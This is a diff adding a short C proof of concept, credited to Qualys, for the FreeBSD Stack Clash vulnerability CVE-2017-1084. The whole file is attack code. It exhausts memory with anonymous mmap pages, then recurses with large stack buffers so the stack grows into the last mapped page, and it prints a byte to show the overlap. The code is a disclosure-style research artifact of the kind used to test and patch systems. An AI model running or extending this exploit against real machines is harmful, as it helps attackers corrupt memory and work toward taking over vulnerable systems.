@@ -1,0 +1,66 @@
+/*
+ * FreeBSD_CVE-2017-FGPU.c for CVE-2017-1084 (please compile with -O0)
+ * Copyright (C) 2017 Qualys, Inc.
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/resource.h>
+#include <sys/time.h>
+
+#define die() do { \
+    fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
+    exit(EXIT_FAILURE); \
+} while (0)
+
+static const char * last_page;
+
+static void
+clash(void)
+{
+    for (;;) {
+        const char * const page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+        if (page <= last_page) die();
+        if (page == MAP_FAILED) break;
+        last_page = page;
+    }
+    if (!last_page) die();
+}
+
+static void
+smash_no_jump(const size_t smash_size)
+{
+    char buf[1024];
+    memset(buf, 'A', sizeof(buf));
+    if (smash_size > sizeof(buf))
+        smash_no_jump(smash_size - sizeof(buf));
+}
+
+#define SGROWSIZ        ((size_t)128UL*1024)            /* amount to grow stack */
+
+int
+main(void)
+{
+    static const struct rlimit core;
+    if (setrlimit(RLIMIT_CORE, &core)) die();
+
+    clash();
+    smash_no_jump(SGROWSIZ / 2 * 3);
+    printf("char at %p: %02x\n", last_page, *last_page);
+    exit(EXIT_SUCCESS);
+}
